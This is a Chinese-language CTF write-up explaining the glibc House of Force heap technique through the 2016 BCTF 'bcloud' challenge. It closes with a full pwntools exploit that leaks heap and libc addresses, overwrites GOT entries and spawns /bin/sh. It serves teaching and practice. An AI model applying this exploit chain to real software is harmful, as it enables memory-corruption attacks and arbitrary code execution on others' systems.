---
title: 2016-BCTF-bcloud-[Heap of Force]
date: 2019-03-20 23:19:07
tags: [House of Force]
---
### 0x00 House of Force
House Of Force 是一种堆利用方法,通过溢出的方式将topchunk的size修改成足够大，在通过申请一定大小的chunk，将topchunk的地址变成我们指定的地址，比如某些函数的got地址，此时再申请一个chunk，那么就可以对该got指针的内容进行修改和利用。

当用户申请chunk时，所有空闲块均不能满足其大小时，glibc就会从topchunk中分割出相应大小的chunk。并不是所有空闲块满足不了的chunk都会从topchunk中分割，glibc对此有一些判断。
在glibc源码`_int_malloc`函数中：
```c
//获取topchunk指针，获取topchunk的大小
victim = av->top;
size   = chunksize(victim);
//如果在分割之后，topchunk的大小大于MINSIZE，那么就可以进行分割。这里还需要加上MINSIZE是由于topchunk必须留下来用作fencepost，以分隔堆和其他空间。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    //更新topchunk
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```
源码中有一段注释
> We require that av->top always exists (i.e., has size >=MINSIZE) after initialization, so if it would otherwise beexhausted by current request, it is replenished. (The mainreason for ensuring it exists is that we may need MINSIZE spaceto put in fenceposts in sysmalloc.)

如果我们可以把topchunk的size篡改成很大的值（比如在x86下篡改为0xffffffff）就可以很容易通过这个验证。
之后topchunk指针会更新，下次申请chunk时，就会把地址分配到更新后的topchunk的地址上，用户如果通过该方式控制了指针，就可以实现任意地址的读和写。

### 2016-BCTF-bcloud
程序的信息如下：
```
Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```
```c
./bcloud
Input your name:
aa
Hey aa! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!
Now let's set synchronization options.
Org:
bb
Host:
cc
OKay! Enjoy:)
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>
```

### 0x02 序及利用分析

#### 1.泄露堆指针
程序有一个自定义的read函数，其功能就是将用户的输入一个字节一个字节写入第一个参数指定的地址，程序有很多地方调用了该函数，比如在程序初始化时输入name、Org、Host时就调用了该函数。
```c
int __cdecl sub_804868D(int a1, int a2, char a3)
{
  char buf; // [esp+1Bh] [ebp-Dh]
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i < a2; ++i )
  {
    if ( read(0, &buf, 1u) <= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  *(_BYTE *)(i + a1) = 0;   //* off by one
  return i;
}
```
在输入name时，由于内存布局有问题，因此上述自定义的read函数*处就出现了off by one 漏洞
```c
unsigned int input_name()
{
  char s; // [esp+1Ch] [ebp-5Ch]
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  iread((int)&s, 64, 10);
  v2 = (char *)malloc(0x40u);
  dword_804B0CC = (int)v2;
  strcpy(v2, &s);
  sub_8048779(v2);
  return __readgsdword(0x14u) ^ v3;
}
```
从上面的注释可以知道s和v2在栈中的位置
```
+------------+
|    v2      |  # ebp-0x1c
+------------+
|    ...     |  # 中间有63个单位的空间
+------------+
|     s      |  # ebp-0x5c
+------------+
```
所以当name的字符串长度为64时，iread函数会在其后加上'\x00'作为字符串截断符，但是这个位置在input_name函数中存放的是v2的地址，v2是堆指针。因为strcpy函数复制内存中的数据是以'\x00'为截断符，因此当name为64字节时，程序会将v2的地址打印出来，在此处`Hey aa! Welcome`泄露堆指针。

#### 2.修改topchunk的大小为0xffffffff
在输入Org处，也存在同样的问题
```c
unsigned int input_org_host()
{
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  int v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&s, 0, 0x90u);
  puts("Org:");
  iread((int)&s, 64, 10);
  puts("Host:");
  iread((int)&v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  dword_804B0C8 = (int)v2;
  dword_804B148 = (int)v4;
  strcpy(v4, (const char *)&v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```
从上面的注释可以知道一些变量的位置
```
+------------+
|    v4      |  # ebp-0x14
+------------+
|    ...     |  
+------------+
|  Host(v3)  |  # ebp-0x58
+------------+
|     v2     |  # ebp-0x5c
+------------+
|    ...     |  # 中间有63个单位的空间
+------------+
|   Org(s)   |  # ebp-0x9c
+------------+
```
当我们Org为64个字节时，Org的的截断符'\x00'被v2截断，当执行strcpy函数时会将Org开始到Host结束的所有数据复制到v2这个堆指针指向的内存区域，而此时v2是距离topchunk最近的chunk，但是其chunkdata大小只有0x40(64)，所以执行`strcpy(v2, &s);`后，v2被覆盖到了topchunk的pprev_size处，Host(v3)覆盖到topchunk的size部分。这样就可以修改topchunk的大小为0xffffffff

#### 3.申请正确大小的内存，修改topchun的指针到0x804b118
第一步泄露的堆指针的地址，我们就可以计算出topchunk指针的地址。第二步修改了topchunk的size为0xffffffff，我们就可以申请足够大的chunk，让topchunk的指针指向我们想要的地址，这里我们选择0x804B118，从下面伪代码*处可以看出，0x804B120存放的是每一个chunk的堆指针。当topchunk指针为0x805b118时，新申请的chunk的data地址就是0x804b120。
```c
int newNote()
{
  int result; // eax
  signed int i; // [esp+18h] [ebp-10h]
  int v2; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i <= 9 && dword_804B120[i]; ++i )
    ;
  if ( i == 10 )
    return puts("Lack of space. Upgrade your account with just $100 :)");
  puts("Input the length of the note content:");
  v2 = sub_8048709();
  dword_804B120[i] = (int)malloc(v2 + 4); //*
  if ( !dword_804B120[i] )
    exit(-1);
  dword_804B0A0[i] = v2;
  puts("Input the content:");
  iread(dword_804B120[i], v2, 10);
  printf("Create success, the id is %d\n", i);
  result = i;
  dword_804B0E0[i] = 0;
  return result;
}
```
首先我们要正确计算申请的chunk，让topchunk指针指向0x804B118，因为需要0x8个字节存放precv_size和size。
```python
note_list = 0x804B120
target_addr = note_list - 0x8
top_addr = leakheap_addr + 0x40 + 0x48 + 0x48 + 24
log.success("top_addr: "+hex(top_addr))
malloc_size = -(top_addr-target_addr) - 0x4 -0x8
log.success("malloc_size: "+hex(malloc_size))
newNote(0x10,'aaaa')
newNote(malloc_size,'cccc')

```
此时的top_addr是在*之前的topchunk的指针，其中0x40+0x48+0x48是保存name、org、host的大小
##### glibc会对申请的内存大小进行调整
```c
/* pad request bytes into a usable size -- internal version */
#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
```
其中在32位系统下SIZE_SZ=4，MALLOC_ALIGN_MASK=8-1=7

所以newNote(0x10,'aaaa')申请内存的操作为malloc(0x10+4)即malloc(0x14)，0x14不是8的倍数，通过`((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)`计算真正分配的内存大小，而glibc中源码有一段注释
```c
/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and
 MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap'ed area is page
aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */
```
所以申请的内存大小为`((0x14) + 4 + 7) & ~7) = 24`，所以要加24，有了topchunk的指针，就可以计算到底该申请多少内存，会让topchunk指针指向0x804b118

`malloc_size = -(top_addr-target_addr) - 0x4 -0x8`，申请正的size会抬高topchunk指针，反之，因此加个负号`-(top_addr-target_addr)`

-0x4是为了抵消程序中的`(int)malloc(v2 + 4)`，-0x8是因为在申请内存时glibc会对申请的大小加上2*SIZE_SZ，填充chunkhead。

#### 4.泄露libc中函数的地址
通过第三步，已经可以控制堆指针，那么我们通过editNote函数就可以写入堆指针。

程序中没有打印chunkdata的功能，因此需要自己构造一个。我的思路是将free函数修改为print，这样就可以打印出chunkdata的内容。
```python
payload = p32(elf.got['free'])
payload += p32(elf.got['atoi'])
payload += p32(elf.got['atoi'])
newNote(0x100,payload)
editNote(0,p32(elf.symbols['printf']))
deleteNote(1)
atoi_addr = u32(p.recvuntil('Delete success.')[1:5])
log.success('atoi_addr: '+hex(atoi_addr))
```
第一个堆指针写为free@got，第二第三堆指针写为atoi@got，将free@got写为print@plt，`deleteNote(1)`时会打印出atoi在libc的地址。

#### 5.计算system的地址
```python
libc_base = atoi_addr - libc.symbols['atoi']
log.success('libc_addr: '+hex(libc_base))
system_addr = libc_base + libc.symbols['system']
log.success('system_addr: '+hex(system_addr))
```

####6.get shell
有了system函数地址，又有可控指针，就可以将atoi@got写为system函数的地址，传入'/bin/sh;'就可以get shell。
```python
editNote(2,p32(system_addr))
p.recvuntil('option--->>')
p.sendline('/bin/sh;')
p.interactive()
```

### 0x03 总结
通过以上分析，可以总结出House of Force的利用条件
- 可以修改topchunk的size
- malloc(size)中的size可控


### 0x04 EXP
```python
#!/usr/bin/env python
from pwn import *
p = process('./bcloud')
elf = ELF('./bcloud')
libc = ELF('./libc')

DEBUG = 0
VERBOSE = 0
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context.log_level = 'debug'

def newNote(length,content):
	p.recvuntil('--->>')
	p.sendline('1')
	p.recvuntil('Input the length of the note content:')
	p.sendline(str(length))
	p.recvuntil('Input the content:')
	p.sendline(content)

def editNote(idx,content):
	p.recvuntil('--->>')
	p.sendline('3')
	p.recvuntil('Input the id:')
	p.sendline(str(idx))
	p.recvuntil('Input the new content:\n')
	p.sendline(content)
	p.recvuntil('Edit success.')

def deleteNote(idx):
	p.recvuntil('--->>')
	p.sendline('4')
	p.recvuntil('Input the id:')
	p.sendline(str(idx))


def pwn():
	#step1. leak heap address
	p.recvuntil('Input your name:')
	p.send('a'*0x38+'b'*8)
	p.recvuntil('b'*8)
	leakheap_addr = u32(p.read(4))

	#step2. set topchunk's size is -1
	p.recvuntil('Org:')
	p.send('b'*0x40)
	p.recvuntil('Host:')
	p.send(p32(0xffffffff)+'\n')

	#step3. alter the topchunk pointer to the target_addr(0x804b118)
	note_list = 0x804B120
        target_addr = note_list - 0x8
        top_addr = leakheap_addr + 0x40 + 0x48 + 0x48 + 24
        log.success("top_addr: "+hex(top_addr))
	malloc_size = -(top_addr-target_addr) - 0x4 -0x8
	log.success("malloc_size: "+hex(malloc_size))
	newNote(0x10,'aaaa')
	newNote(malloc_size,'cccc')


	#step4. leak atoi_addr
	payload = p32(elf.got['free'])
	payload += p32(elf.got['atoi'])
	payload += p32(elf.got['atoi'])
	newNote(0x100,payload)
	editNote(0,p32(elf.symbols['printf']))
	deleteNote(1)
	atoi_addr = u32(p.recvuntil('Delete success.')[1:5])
	log.success('atoi_addr: '+hex(atoi_addr))

	#step5. calc system_addr
	libc_base = atoi_addr - libc.symbols['atoi']
	log.success('libc_addr: '+hex(libc_base))
	system_addr = libc_base + libc.symbols['system']
	log.success('system_addr: '+hex(system_addr))

	#step6. get shell
	editNote(2,p32(system_addr))
	p.recvuntil('option--->>')
	p.sendline('/bin/sh;')
	p.interactive()

if __name__ == "__main__":
	pwn()
```
